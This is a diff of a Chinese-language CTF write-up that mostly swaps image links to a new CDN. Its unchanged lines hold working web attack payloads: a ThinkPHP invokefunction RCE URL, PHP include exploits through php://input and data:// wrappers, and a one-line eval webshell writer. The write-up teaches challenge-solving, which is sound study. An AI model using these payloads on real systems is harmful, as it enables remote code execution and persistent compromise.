@@ -6,11 +6,11 @@
 
 为啥？查看网络
 
-![image-20210304133349779](https://abc.p0lar1s.com/202110290052654.png)
+![image-20210304133349779](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041803902.png)
 
 访问111.200.241.244，响应状态码是302，HTTP状态码302 表示临时性重定向，所以会被重定向到服务器希望我们访问的页面，即111.200.241.244/1.php
 
-![image-20210304133641176](https://abc.p0lar1s.com/202110290052864.png)
+![image-20210304133641176](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041803712.png)
 
 HTTP状态码相关知识：
 
@@ -76,9 +76,9 @@ HTTP状态码列表:
 
 就这
 
-![image-20210304141552596](https://abc.p0lar1s.com/202110290052723.png)
+![image-20210304141552596](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804072.png)
 
-![image-20210304141634067](https://abc.p0lar1s.com/202110290055302.png)
+![image-20210304141634067](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804362.png)
 
 ## 3.php_rce
 
@@ -86,13 +86,13 @@ HTTP状态码列表:
 
 ***RCE***英文全称:remote command/code execute,远程指令/代码执行
 
-![image-20210304142110418](https://abc.p0lar1s.com/202110290052507.png)
+![image-20210304142110418](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804323.png)
 
 **遇到一个完整的框架，就要去搜一下它存在什么漏洞**
 
 还不会分析漏洞……但也没关系，百度到一个payload
 
-![image-20210304143659962](https://abc.p0lar1s.com/202110290052761.png)
+![image-20210304143659962](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804224.png)
 
 修改一下
 
@@ -102,13 +102,13 @@ HTTP状态码列表:
 
 [http://111.200.241.244:57782/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag](http://111.200.241.244:57782/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag)
 
-![image-20210304144403524](https://abc.p0lar1s.com/202110290052606.png)
+![image-20210304144403524](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804704.png)
 
 ## 4.Web_php_include
 
 看到代码：
 
-![image-20210304151733263](https://abc.p0lar1s.com/202110290052367.png)
+![image-20210304151733263](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804577.png)
 
 **php中，`include` 语句包含并运行指定文件**
 
@@ -131,7 +131,7 @@ http://127.0.0.1/include.php?file=php://input
 <?php phpinfo(); ?>
 ```
 
-![preview](https://abc.p0lar1s.com/202110290053166.jpeg)
+![preview](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804813.jpeg)
 
 若有写入权限，写入一句话木马
 
@@ -141,7 +141,7 @@ http://127.0.0.1/include.php?file=php://input
 <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
 ```
 
-![preview](https://abc.p0lar1s.com/202110290053842.jpeg)
+![preview](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804431.jpeg)
 
 ### 2.`PHP>=5.2.0`可以使用`data://`数据流封装器，以传递相应格式的数据，用来执行PHP代码
 
@@ -153,7 +153,7 @@ http://127.0.0.1/include.php?file=php://input
 http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 ```
 
-![preview](https://abc.p0lar1s.com/202110290053530.jpeg)
+![preview](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804460.jpeg)
 
 #### 2.data://text/plain;base64,
 
@@ -161,39 +161,39 @@ http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
 ```
 
-![preview](https://abc.p0lar1s.com/202110290053566.jpeg)
+![preview](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804792.jpeg)
 
 回到本题
 
-![image-20210304154949956](https://abc.p0lar1s.com/202110290053424.png)
+![image-20210304154949956](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804666.png)
 
 可以看到对php://做了过滤，将“php://”替换成了""，所以采用data://text/plain对我们要执行的命令进行封装，并提供给page变量，命令被包含在include($page);的地方并被执行。
 
 先执行system("ls");,看看当前目录下有啥文件http://111.200.241.244:35140/?page=data://text/plain,%3C?php%20system(%22ls%22);?%3E
 
-![image-20210304155722010](https://abc.p0lar1s.com/202110290053116.png)
+![image-20210304155722010](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804217.png)
 
 然后system("cat fl4gisisish3r3.php");
 
 啥也没显示，flag在哪里？
 
-![image-20210304155843876](https://abc.p0lar1s.com/202110290054303.png)
+![image-20210304155843876](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804329.png)
 
 在这里
 
-![image-20210304155905379](https://abc.p0lar1s.com/202110290054414.png)
+![image-20210304155905379](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804883.png)
 
 据说和阿帕奇服务器的安全机制有关，这里不再赘述。
 
 这样写也行，用file_get_contents()函数将文件内容读入$a,再将$a显示在页面上，若不使用hemispecialchars函数，同样不显示在页面上，而是在源码中。
 
-![image-20210304160603002](https://abc.p0lar1s.com/202110290054051.png)
+![image-20210304160603002](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804750.png)
 
 本题采用大小写绕过也是可以的,将php换成phP一样可以post命令过去然后执行
 
-![image-20210304161235246](https://abc.p0lar1s.com/202110290054864.png)
+![image-20210304161235246](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804877.png)
 
-![image-20210304161359557](https://abc.p0lar1s.com/202110290054153.png)
+![image-20210304161359557](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804748.png)
 
-![image-20210304161410701](https://abc.p0lar1s.com/202110290055229.png)
+![image-20210304161410701](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041804901.png)
 
